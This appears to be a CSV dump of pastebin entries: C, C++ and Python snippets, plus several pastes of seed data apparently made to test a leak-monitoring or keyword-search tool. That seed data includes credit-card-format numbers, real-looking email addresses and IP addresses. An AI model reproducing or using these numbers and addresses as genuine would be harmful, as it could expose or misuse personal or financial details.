id,title,username,language,date,content
jMarFgfj,Списки(3 сем),anticlown,C,Tuesday 21st of November 2023 12:03:22 PM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <malloc.h>
#include <stdbool.h>

//node struct
typedef struct Node {
    int value;
    struct Node* next;
} Node;

//struct methods prototypes
int pop(Node** head);
void popBack(Node** head);
void push(Node** head, int data);
void pushBack(Node* head, int value);
Node* getNth(Node* head, int n);
Node* getLast(Node* head);
Node* getLastButOne(Node* head);
void insert(Node* head, unsigned pos, int val);
int deleteNth(Node** head, int n);
void fromArray(Node** head, int* arr, size_t size);
int* toArray(const Node* head, const int length);
void printLinkedList(const Node* head);

//task prototypes
void insert44BeforeAnyMultipleOfSeven(Node* head);

//print prototypes
void printLinkedList(const Node* head);
void printTaskInfo();

/*      list methods start      */
void push(Node** head, int data) {
    Node* tmp = (Node*)malloc(sizeof(Node));
    tmp->value = data;
    tmp->next = (*head);
    (*head) = tmp;
}

void pushBack(Node* head, int value) {
    Node* last = getLast(head);
    Node* tmp = (Node*)malloc(sizeof(Node));
    tmp->value = value;
    tmp->next = NULL;
    last->next = tmp;
}

int pop(Node** head) {
    Node* prev = NULL;
    int val;
    if (head == NULL) {
        exit(-1);
    }
    prev = (*head);
    val = prev->value;
    (*head) = (*head)->next;
    free(prev);
    return val;
}

void popBack(Node** head) {
    Node* lastbn = NULL;
    //Получили NULL
    if (!head) {
        exit(-1);
    }
    //Список пуст
    if (!(*head)) {
        exit(-1);
    }
    lastbn = getLastButOne(*head);
    //Если в списке один элемент
    if (lastbn == NULL) {
        free(*head);
        *head = NULL;
    }
    else {
        free(lastbn->next);
        lastbn->next = NULL;
    }
}

Node* getNth(Node* head, int n) {
    int counter = 0;
    while (counter < n && head) {
        head = head->next;
        counter++;
    }
    return head;
}

Node* getLast(Node* head) {
    if (head == NULL) {
        return NULL;
    }
    while (head->next) {
        head = head->next;
    }
    return head;
}

Node* getLastButOne(Node* head) {
    if (head == NULL) {
        exit(-2);
    }
    if (head->next == NULL) {
        return NULL;
    }
    while (head->next->next) {
        head = head->next;
    }
    return head;
}

//вставка на n-ое место
void insert(Node* head, unsigned pos, int val) {
    unsigned i = 0;
    Node* tmp = NULL;
    while (i < pos && head->next) {
        head = head->next;
        i++;
    }
    tmp = (Node*)malloc(sizeof(Node));
    tmp->value = val;
    if (head->next) {
        tmp->next = head->next;
    }
    else {
        tmp->next = NULL;
    }
    head->next = tmp;
}

//удаление n-го места
int deleteNth(Node** head, int n) {
    if (n == 0) {
        return pop(head);
    }
    else {
        Node* prev = getNth(*head, n - 1);
        Node* elm = prev->next;
        int val = elm->value;

        prev->next = elm->next;
        free(elm);
        return val;
    }
}

void fromArray(Node** head, int* arr, size_t size) {
    size_t i = size - 1;
    if (arr == NULL || size == 0) {
        return;
    }
    do {
        push(head, arr[i]);
    } while (i-- != 0);
}

int* toArray(const Node* head, const int length) {
    int leng = length;
    int* values = (int*)malloc(leng * sizeof(int));
    while (head) {
        values[--leng] = head->value;
        head = head->next;
    }
    return values;
}

/*      task methods start      */
int findFirstMultipleOfFive(const Node* head) {
    int counter = 0;
    while (head) {
        if (head->value % 5 == 0) {
            return counter;
        }
        counter++;
        head = head->next;
    }
    return -1;
}

void insert44BeforeAnyMultipleOfSeven(Node* head) {
    int pos = 0;
    Node* tempHead = head;
    while (tempHead) {
        if (tempHead->value % 7 == 0) {
           insert(head, pos - 1, 44);
           pos++;
        }
        pos++;
        tempHead = tempHead->next;
    }
}
/*      task methods end        */

/*      print procs start      */
void printLinkedList(const Node* head) {
    while (head) {
        printf(""%d "", head->value);
        head = head->next;
    }
    printf(""\n"");
}

void printTaskInfo() {
    printf(""Данная программа создает однонаправленный список из целых чисел.\n"");
    printf(""Затем удаляет первый элемент, кратный 5. После этого вставляет число 44 перед каждым числом, кратным 7.\n"");
}
/*      print procs end      */

int main()
{
    setlocale(LC_ALL, ""Rus"");
    printTaskInfo();
    Node* head = NULL;

    int arr[] = { 1,7,5,23,25,11,12,21,19,100 };
    fromArray(&head, arr, 10);

    printf(""Начальный список: "");
    printLinkedList(head);

    int posToDel = findFirstMultipleOfFive(head);
    if (posToDel == -1) {
        printf(""Элемента со значением, кратным пяти, нет в списке."");
    }
    else {
        deleteNth(&head, posToDel);
        printf(""Список после удаление первого элемента, кратного пяти: "");
        printLinkedList(head);
    }

    insert44BeforeAnyMultipleOfSeven(head);
    printf(""Список после вставки 44 перед каждым элементом, кратным семи: "");
    printLinkedList(head);

    getch();
}"
kFaDjYrr,01. Valid Usernames,Spocoman,C++,Tuesday 21st of November 2023 12:01:20 PM CDT,"#include <iostream>
#include <string>

using namespace std;

int main() { 
    string passwords, pass;
    getline(cin, passwords);

    while (passwords.length() != 0) {
        pass = passwords.substr(0, passwords.find("", ""));
        passwords.erase(0, pass.length() + 2);
        bool isValid = true;
        if (pass.length() > 3 && pass.length() <= 16) {
            for (size_t i = 0; i < pass.length(); i++) {
                if (!isalpha(pass[i]) && !isdigit(pass[i]) && pass[i] != '-' && pass[i] != '_') {
                    isValid = false;
                    continue;
                }
            }
        }
        else {
            continue;
        }
       
        if (isValid) {
            cout << pass << endl;
        }
    }

    return 0;
}"
LVPHsZj5,func_decorator_for_recursive_fibonacci_with_cache,bAngelov,Python,Tuesday 21st of November 2023 11:58:33 AM CDT,"def cache(func):
    def decorator(n):
        if not decorator.log.get(n):
            decorator.log[n] = func(n)
        return decorator.log[n]
    decorator.log = {}
    return decorator"
ibZ5aXDb,Untitled,wheresTheAnyKey,Bash,Tuesday 21st of November 2023 11:54:40 AM CDT,"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s sohail.ayers@greencastle.org.uk the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

"
jDMr67QL,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:13 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
hbfTyq6X,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:11 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
FCB3M7XT,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:10 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
VsznPTQZ,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:08 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
7R7jKbEL,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:07 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
NVyCXr59,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:05 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
